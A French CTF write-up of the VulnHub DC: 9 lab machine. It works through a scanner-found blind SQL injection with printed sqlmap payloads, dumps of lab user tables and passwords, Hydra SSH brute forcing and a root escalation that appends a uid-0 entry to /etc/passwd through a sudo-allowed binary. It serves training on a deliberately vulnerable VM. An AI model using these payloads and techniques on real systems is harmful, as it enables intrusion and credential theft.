---
title: "Solution du CTF DC: 9 de VulnHub"
tags: [VulnHub, CTF]
---

[DC: 9](https://vulnhub.com/entry/dc-9,412/) est un CTF disponible sur _VulnHub_ et qui a été publié fin décembre 2019. C'est le dernier de sa série.

Un scan Nmap remonte un port 22 filtré ainsi qu'un serveur web ouvert qui livre une application web custom.

## Ce jour heureux est plein d'allégresse

Je lance alors [GitHub - wapiti-scanner/wapiti: Web vulnerability scanner written in Python3](https://github.com/wapiti-scanner/wapiti) pour chercher s'il y a différentes vulnérabilités :

```console
$ wapiti -u http://192.168.56.140/ --color -m all

     __      __               .__  __  .__________
    /  \    /  \_____  ______ |__|/  |_|__\_____  \
    \   \/\/   /\__  \ \____ \|  \   __\  | _(__  <
     \        /  / __ \|  |_> >  ||  | |  |/       \
      \__/\  /  (____  /   __/|__||__| |__/______  /
           \/        \/|__|                      \/
Wapiti 3.1.7 (wapiti-scanner.github.io)
[*] Saving scan state, please wait...

[*] Launching module xss

[*] Launching module ssrf

[*] Launching module wapp
---
Apache ['2.4.38'] detected
  -> Categories: ['Web servers']
  -> Group(s): ['Servers']

Debian [] detected
  -> Categories: ['Operating systems']
  -> Group(s): ['Servers']


[*] Launching module http_headers
Checking X-Frame-Options :
X-Frame-Options is not set
Checking X-Content-Type-Options :
X-Content-Type-Options is not set

[*] Launching module drupal_enum
No Drupal Detected

[*] Launching module backup

[*] Launching module csp
CSP is not set

[*] Launching module log4shell

[*] Launching module exec

[*] Launching module csrf
---
Lack of anti CSRF token
    POST /manage.php HTTP/1.1
    host: 192.168.56.140
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    content-type: application/x-www-form-urlencoded
    referer: http://192.168.56.140/manage.php
    cookie: PHPSESSID=2617mule6gb8cc34h87dt49g1b
    content-length: 32
    Content-Type: application/x-www-form-urlencoded

    username=alice&password=Letm3in_
---
---
Lack of anti CSRF token
    POST /results.php HTTP/1.1
    host: 192.168.56.140
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    content-type: application/x-www-form-urlencoded
    referer: http://192.168.56.140/search.php
    cookie: PHPSESSID=2617mule6gb8cc34h87dt49g1b
    content-length: 14
    Content-Type: application/x-www-form-urlencoded

    search=default
---

[*] Launching module takeover

[*] Launching module htaccess

[*] Launching module nikto
---
PHP Config file may contain database IDs and passwords.
http://192.168.56.140/config.php
---
---
This might be interesting.
http://192.168.56.140/css/
References:
  https://vulners.com/osvdb/OSVDB:3092
---
---
This might be interesting.
http://192.168.56.140/includes/
References:
  https://vulners.com/osvdb/OSVDB:3092
---
---
Apache default file found.
http://192.168.56.140/icons/README
References:
  https://vulners.com/osvdb/OSVDB:3233
---
---
Apache server-status interface found (protected/forbidden)
http://192.168.56.140/server-status
---
1 requests were skipped due to network issues

[*] Launching module redirect

[*] Launching module buster

[*] Launching module wp_enum
No WordPress Detected

[*] Launching module crlf

[*] Launching module file

[*] Launching module brute_login_form

[*] Launching module sql

[*] Launching module ssl

[*] Launching module shellshock

[*] Launching module htp

[*] Launching module cookieflags
Checking cookie : PHPSESSID
HttpOnly flag is not set in the cookie : PHPSESSID
Secure flag is not set in the cookie : PHPSESSID

[*] Launching module xxe

[*] Launching module permanentxss

[*] Launching module timesql
---
Blind SQL vulnerability in http://192.168.56.140/results.php via injection in the parameter search
Evil request:
    POST /results.php HTTP/1.1
    Content-Type: application/x-www-form-urlencoded

    search=%27%20or%20sleep%287%29%231
---

[*] Launching module methods

[*] Generating report...
A report has been generated in the file /home/devloop/.wapiti/generated_report
Open /home/devloop/.wapiti/generated_report/192.168.56.140_03232023_1057.html with a browser to see this report.
```

En dehors des fichiers découverts et autres recommendations concernant les entêtes, c'est surtout l'injection SQL en aveugle dans `results.php` qui nous intéressera. Comme toujours on enchaine avec un `sqlmap` qui fait parfaitement le job :

```bash
python sqlmap.py -u http://192.168.56.140/results.php --data "search=mary"
```

Le scanner identifie la vulnérabilité et la version du backend :

```
sqlmap identified the following injection point(s) with a total of 65 HTTP(s) requests:
---
Parameter: search (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: search=mary' AND 5044=5044 AND 'lNyT'='lNyT

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=mary' AND (SELECT 9085 FROM (SELECT(SLEEP(5)))zJCo) AND 'XMzY'='XMzY

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: search=mary' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716a706a71,0x4d496f6b57426f645577576c5751727779467a5a484e6e4f4d4b5944456d696f4c6378484a6d4b75,0x71707a7871),NULL-- -
---
[12:02:01] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
```

## Monica777

On peut alors dumper les tables dans la joie et l'allégresse :

```
Database: Staff
Table: StaffDetails
[17 entries]
+----+----------------+-----------------------+---------------------+------------+-----------+-------------------------------+
| id | phone          | email                 | reg_date            | lastname   | firstname | position                      |
+----+----------------+-----------------------+---------------------+------------+-----------+-------------------------------+
| 1  | 46478415155456 | marym@example.com     | 2019-05-01 17:32:00 | Moe        | Mary      | CEO                           |
| 2  | 46457131654    | julied@example.com    | 2019-05-01 17:32:00 | Dooley     | Julie     | Human Resources               |
| 3  | 46415323       | fredf@example.com     | 2019-05-01 17:32:00 | Flintstone | Fred      | Systems Administrator         |
| 4  | 324643564      | barneyr@example.com   | 2019-05-01 17:32:00 | Rubble     | Barney    | Help Desk                     |
| 5  | 802438797      | tomc@example.com      | 2019-05-01 17:32:00 | Cat        | Tom       | Driver                        |
| 6  | 24342654756    | jerrym@example.com    | 2019-05-01 17:32:00 | Mouse      | Jerry     | Stores                        |
| 7  | 243457487      | wilmaf@example.com    | 2019-05-01 17:32:00 | Flintstone | Wilma     | Accounts                      |
| 8  | 90239724378    | bettyr@example.com    | 2019-05-01 17:32:00 | Rubble     | Betty     | Junior Accounts               |
| 9  | 189024789      | chandlerb@example.com | 2019-05-01 17:32:00 | Bing       | Chandler  | President - Sales             |
| 10 | 232131654      | joeyt@example.com     | 2019-05-01 17:32:00 | Tribbiani  | Joey      | Janitor                       |
| 11 | 823897243978   | rachelg@example.com   | 2019-05-01 17:32:00 | Green      | Rachel    | Personal Assistant            |
| 12 | 6549638203     | rossg@example.com     | 2019-05-01 17:32:00 | Geller     | Ross      | Instructor                    |
| 13 | 8092432798     | monicag@example.com   | 2019-05-01 17:32:00 | Geller     | Monica    | Marketing                     |
| 14 | 43289079824    | phoebeb@example.com   | 2019-05-01 17:32:02 | Buffay     | Phoebe    | Assistant Janitor             |
| 15 | 454786464      | scoots@example.com    | 2019-05-01 20:16:33 | McScoots   | Scooter   | Resident Cat                  |
| 16 | 65464646479741 | janitor@example.com   | 2019-12-23 03:11:39 | Trump      | Donald    | Replacement Janitor           |
| 17 | 47836546413    | janitor2@example.com  | 2019-12-24 03:41:04 | Morrison   | Scott     | Assistant Replacement Janitor |
+----+----------------+-----------------------+---------------------+------------+-----------+-------------------------------+

Database: Staff
Table: Users
[1 entry]
+--------+----------+----------------------------------+
| UserID | Username | Password                         |
+--------+----------+----------------------------------+
| 1      | admin    | 856f5de590ef37314e7c3bdf6f8a66dc |
+--------+----------+----------------------------------+
```

Une bonne partie des utilisateurs est nommée d'après les personnages de la série TV *Friends*.

Le hash de l'utilisateur `admin` se casse via *crackstation.net*, il s'agit de `transorbital1`.

La table `users` contient les mots de passe en clair :

```
Database: users
Table: UserDetails
[17 entries]
+----+-----------+------------+---------------------+---------------+-----------+
| id | username  | lastname   | reg_date            | password      | firstname |
+----+-----------+------------+---------------------+---------------+-----------+
| 1  | marym     | Moe        | 2019-12-29 16:58:26 | 3kfs86sfd     | Mary      |
| 2  | julied    | Dooley     | 2019-12-29 16:58:26 | 468sfdfsd2    | Julie     |
| 3  | fredf     | Flintstone | 2019-12-29 16:58:26 | 4sfd87sfd1    | Fred      |
| 4  | barneyr   | Rubble     | 2019-12-29 16:58:26 | RocksOff      | Barney    |
| 5  | tomc      | Cat        | 2019-12-29 16:58:26 | TC&TheBoyz    | Tom       |
| 6  | jerrym    | Mouse      | 2019-12-29 16:58:26 | B8m#48sd      | Jerry     |
| 7  | wilmaf    | Flintstone | 2019-12-29 16:58:26 | Pebbles       | Wilma     |
| 8  | bettyr    | Rubble     | 2019-12-29 16:58:26 | BamBam01      | Betty     |
| 9  | chandlerb | Bing       | 2019-12-29 16:58:26 | UrAG0D!       | Chandler  |
| 10 | joeyt     | Tribbiani  | 2019-12-29 16:58:26 | Passw0rd      | Joey      |
| 11 | rachelg   | Green      | 2019-12-29 16:58:26 | yN72#dsd      | Rachel    |
| 12 | rossg     | Geller     | 2019-12-29 16:58:26 | ILoveRachel   | Ross      |
| 13 | monicag   | Geller     | 2019-12-29 16:58:26 | 3248dsds7s    | Monica    |
| 14 | phoebeb   | Buffay     | 2019-12-29 16:58:26 | smellycats    | Phoebe    |
| 15 | scoots    | McScoots   | 2019-12-29 16:58:26 | YR3BVxxxw87   | Scooter   |
| 16 | janitor   | Trump      | 2019-12-29 16:58:26 | Ilovepeepee   | Donald    |
| 17 | janitor2  | Morrison   | 2019-12-29 16:58:28 | Hawaii-Five-0 | Scott     |
+----+-----------+------------+---------------------+---------------+-----------+
```

Quand on se connecte sur l'appli web avec le compte `admin` on peut alors accéder à interface permettant de rajouter de nouveaux utilisateurs. Une faille SQL est aussi présente, mais les requêtes se faisant avec le même compte MySQL, ça n'a pas vraiment d'intérêt.

J'ai relevé la présence du message `File does not exist` en pied de page de la section admin. J'ai tenté de trouver un paramètre qui permettrait une inclusion de fichier :

```bash
ffuf -u "http://192.168.56.140/welcome.php?FUZZ=/etc/passwd" -H "Cookie: PHPSESSID=ji8e4r3hdokmqg52e4tqmoo5ob;" -w common_query_parameter_names.txt -fs 963
```

Mais je n'ai rien trouvé. Je n'étais finalement pas très loin, car c'était la méthode attendue. Il fallait en fait spécifier un chemin relatif pour le `/etc/passwd` comme l'a fait [Hummus-Ful](https://hummus-ful.github.io/vulnhub/2021/01/22/DC-9.html).

À partir de là il était possible de fuiter la configuration du service `knockd` et donc de connaître la séquence pour rendre accessible le port 22.

Il faut croire que j'ai eu suffisamment de chance, car il m'a suffi de refaire un scan de port et cette fois le port 22 était accessible 🤞

J'ai donc compilé une liste de users et passwords depuis les données du dump et balancé tout ça à [GitHub - vanhauser-thc/thc-hydra: hydra](https://github.com/vanhauser-thc/thc-hydra) :

```console
$ hydra -L users.txt -P pass.txt ssh://192.168.56.140
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 324 login tries (l:18/p:18), ~21 tries per task
[DATA] attacking ssh://192.168.56.140:22/
[22][ssh] host: 192.168.56.140   login: chandlerb   password: UrAG0D!
[22][ssh] host: 192.168.56.140   login: joeyt   password: Passw0rd
[22][ssh] host: 192.168.56.140   login: janitor   password: Ilovepeepee
1 of 1 target successfully completed, 3 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished
```

Tous les comptes trouvés sont standard (ne faisant pas partie d'un groupe particulier). On note qu'il y a un bon nombre d'utilisateurs sur le système :

```
marym:x:1001:1001:Mary Moe:/home/marym:/bin/bash
julied:x:1002:1002:Julie Dooley:/home/julied:/bin/bash
fredf:x:1003:1003:Fred Flintstone:/home/fredf:/bin/bash
barneyr:x:1004:1004:Barney Rubble:/home/barneyr:/bin/bash
tomc:x:1005:1005:Tom Cat:/home/tomc:/bin/bash
jerrym:x:1006:1006:Jerry Mouse:/home/jerrym:/bin/bash
wilmaf:x:1007:1007:Wilma Flintstone:/home/wilmaf:/bin/bash
bettyr:x:1008:1008:Betty Rubble:/home/bettyr:/bin/bash
chandlerb:x:1009:1009:Chandler Bing:/home/chandlerb:/bin/bash
joeyt:x:1010:1010:Joey Tribbiani:/home/joeyt:/bin/bash
rachelg:x:1011:1011:Rachel Green:/home/rachelg:/bin/bash
rossg:x:1012:1012:Ross Geller:/home/rossg:/bin/bash
monicag:x:1013:1013:Monica Geller:/home/monicag:/bin/bash
phoebeb:x:1014:1014:Phoebe Buffay:/home/phoebeb:/bin/bash
scoots:x:1015:1015:Scooter McScoots:/home/scoots:/bin/bash
janitor:x:1016:1016:Donald Trump:/home/janitor:/bin/bash
janitor2:x:1017:1017:Scott Morrison:/home/janitor2:/bin/bash
```

Finalement, c'est le compte `Janitor` (aka `Donald Trump`) qui a un fichier intéressant :

```console
janitor@dc-9:~$ ls -al
total 16
drwx------  4 janitor janitor 4096 Mar 24 00:54 .
drwxr-xr-x 19 root    root    4096 Dec 29  2019 ..
lrwxrwxrwx  1 janitor janitor    9 Dec 29  2019 .bash_history -> /dev/null
drwx------  3 janitor janitor 4096 Mar 24 00:54 .gnupg
drwx------  2 janitor janitor 4096 Dec 29  2019 .secrets-for-putin
janitor@dc-9:~$ ls .secrets-for-putin/
passwords-found-on-post-it-notes.txt
janitor@dc-9:~$ cat .secrets-for-putin/passwords-found-on-post-it-notes.txt 
BamBam01
Passw0rd
smellycats
P0Lic#10-4
B4-Tru3-001
4uGU5T-NiGHts
```

Je rajoute les passwords manquants dans la liste et je relance `Hydra` :

```
[22][ssh] host: 192.168.56.140   login: fredf   password: B4-Tru3-001
```

## Ajoute

Ce nouvel utilisateur a une permission particulière :

```console
fredf@dc-9:~$ sudo -l
Matching Defaults entries for fredf on dc-9:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User fredf may run the following commands on dc-9:
    (root) NOPASSWD: /opt/devstuff/dist/test/test
```

Il s'agit d'un gros exécutable bien que compilé en dynamique.

```console
fredf@dc-9:~$ file /opt/devstuff/dist/test/test
/opt/devstuff/dist/test/test: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=28ba79c778f7402713aec6af319ee0fbaf3a8014, stripped
fredf@dc-9:~$ ls -al /opt/devstuff/dist/test/test
-rwxr-xr-x 1 root root 1212968 Dec 29  2019 /opt/devstuff/dist/test/test
```

Il s'agit visiblement d'un code Python qui a été compilé en ELF. Avec quelques essais, on se fait une idée de son fonctionnement :

```console
fredf@dc-9:~$ /opt/devstuff/dist/test/test read append
Traceback (most recent call last):
  File "test.py", line 10, in <module>
FileNotFoundError: [Errno 2] No such file or directory: 'read'
[3559] Failed to execute script test
fredf@dc-9:~$ echo test > yolo
fredf@dc-9:~$ /opt/devstuff/dist/test/test yolo append
fredf@dc-9:~$ cat yolo 
test
fredf@dc-9:~$ ls
append  yolo
fredf@dc-9:~$ cat append 
test
```

Reste à savoir s'il ajoute seulement sans écraser le contenu.

```console
fredf@dc-9:~$ echo this is dope > yolo
fredf@dc-9:~$ /opt/devstuff/dist/test/test yolo append
fredf@dc-9:~$ cat append 
test
this is dope
```

C'est bien le cas. Je vais en profiter pour rajouter une ligne au fichier `/etc/passwd` :

```console
fredf@dc-9:~$ echo devloop:ueqwOCnSGdsuM:0:0::/root:/bin/sh > yolo
fredf@dc-9:~$ sudo /opt/devstuff/dist/test/test yolo /etc/passwd
fredf@dc-9:~$ su devloop
Password: 
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
theflag.txt
# cat theflag.txt


███╗   ██╗██╗ ██████╗███████╗    ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗██╗██╗██╗
████╗  ██║██║██╔════╝██╔════╝    ██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║
██╔██╗ ██║██║██║     █████╗      ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ██║██║██║
██║╚██╗██║██║██║     ██╔══╝      ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝
██║ ╚████║██║╚██████╗███████╗    ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗██╗██╗██╗
╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝     ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝
                                                                             
Congratulations - you have done well to get to this point.

Hope you enjoyed DC-9.  Just wanted to send out a big thanks to all those
who have taken the time to complete the various DC challenges.

I also want to send out a big thank you to the various members of @m0tl3ycr3w .

They are an inspirational bunch of fellows.

Sure, they might smell a bit, but...just kidding.  :-)

Sadly, all things must come to an end, and this will be the last ever
challenge in the DC series.

So long, and thanks for all the fish.
```
